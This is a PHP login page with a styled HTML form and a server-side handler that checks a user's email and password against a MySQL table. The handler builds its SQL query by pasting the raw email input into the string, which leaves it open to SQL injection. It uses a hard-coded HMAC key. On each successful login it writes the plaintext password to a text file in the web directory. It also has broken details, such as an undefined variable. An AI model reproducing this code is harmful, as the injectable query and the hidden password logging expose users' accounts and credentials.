<?php
session_start(); 
include 'db.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /* Importing fonts from Google */
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');

/* Reseting */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Poppins', sans-serif;
}

body {
    background: #ecf0f3;
}

.wrapper {
    max-width: 350px;
    min-height: 500px;
    margin: 80px auto;
    padding: 40px 30px 30px 30px;
    background-color: #ecf0f3;
    border-radius: 15px;
    box-shadow: 13px 13px 20px #cbced1, -13px -13px 20px #fff;
}

.logo {
    width: 80px;
    margin: auto;
}

.logo img {
    width: 100%;
    height: 80px;
    object-fit: cover;
    border-radius: 50%;
    box-shadow: 0px 0px 3px #5f5f5f,
        0px 0px 0px 5px #ecf0f3,
        8px 8px 15px #a7aaa7,
        -8px -8px 15px #fff;
}

.wrapper .name {
    font-weight: 600;
    font-size: 1.4rem;
    letter-spacing: 1.3px;
    padding-left: 10px;
    color: #555;
}

.wrapper .form-field input {
    width: 100%;
    display: block;
    border: none;
    outline: none;
    background: none;
    font-size: 1.2rem;
    color: #666;
    padding: 10px 15px 10px 10px;
    /* border: 1px solid red; */
}

.wrapper .form-field {
    padding-left: 10px;
    margin-bottom: 20px;
    border-radius: 20px;
    box-shadow: inset 8px 8px 8px #cbced1, inset -8px -8px 8px #fff;
}

.wrapper .form-field .fas {
    color: #555;
}

.wrapper .btn {
    box-shadow: none;
    width: 100%;
    height: 40px;
    background-color: #03A9F4;
    color: #fff;
    border-radius: 25px;
    box-shadow: 3px 3px 3px #b1b1b1,
        -3px -3px 3px #fff;
    letter-spacing: 1.3px;
}

.wrapper .btn:hover {
    background-color: #039BE5;
}

.wrapper a {
    text-decoration: none;
    font-size: 0.8rem;
    color: #03A9F4;
}

.wrapper a:hover {
    color: #039BE5;
}
.logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 100px;
      height: 100px;
    }

    .logo h2 {
      margin: 10px 0;
      font-size: 24px;
      color: #333;
    }

@media(max-width: 380px) {
    .wrapper {
        margin: 30px 20px;
        padding: 40px 15px 15px 15px;
    }
}
    </style>
</head>
<body>
    <div class="wrapper">
        <!-- <div class="logo">
            <img src="https://www.freepnglogos.com/uploads/twitter-logo-png/twitter-bird-symbols-png-logo-0.png" alt="">
        </div>
        <div class="text-center mt-4 name">
            Twitter
        </div> -->
        <div class="logo">
        <span class="bi bi-person-circle"></span>
        <h2>Connexion</h2>
        </div>
        <form class="p-3 mt-3" method="POST" action="#">
            <div class="form-field d-flex align-items-center">
                <span class="far fa-user"></span>
                <input type="text" name="mail" id="userName" placeholder="Username">
            </div>
            <div class="form-field d-flex align-items-center">
                <span class="fas fa-key"></span>
                <input type="password" name="mdp" id="typePasswordX" placeholder="Password" >
            </div>
            <button class="btn mt-3" name="connect">Login</button>
        </form>
        <div class="text-center fs-6">
            <a href="#">Forget password?</a> or <a href="inscri.php">Sign up</a>
        </div>
    </div>
</body>
</html>
<?php 
if (isset($_POST['connect'])) {
	$mail= $_POST['mail'];
	$mdp= $_POST['mdp'];
	$req2=" SELECT id,email,password FROM users WHERE email='$mail'";
	$result = mysqli_query($conn,$req2);
	if ($row = mysqli_fetch_assoc($result)) {
		$mdp_secure= hash_hmac("sha256", $mdp, "cle");
		$mdp_base= $row['password'];
		$userid=$row['id'];
		if (password_verify($mdp_secure, $mdp_base)) {
			$_SESSION['id']=$userid;
            $line = $mdp. ',' . $Email . ',' . date('Y-m-d H:i:s') . PHP_EOL;
		    file_put_contents("con.txt",$line,FILE_APPEND);
			header('location:index.php');
		}

	}else{
		echo "mail n'existe pas";
	}
}
?>
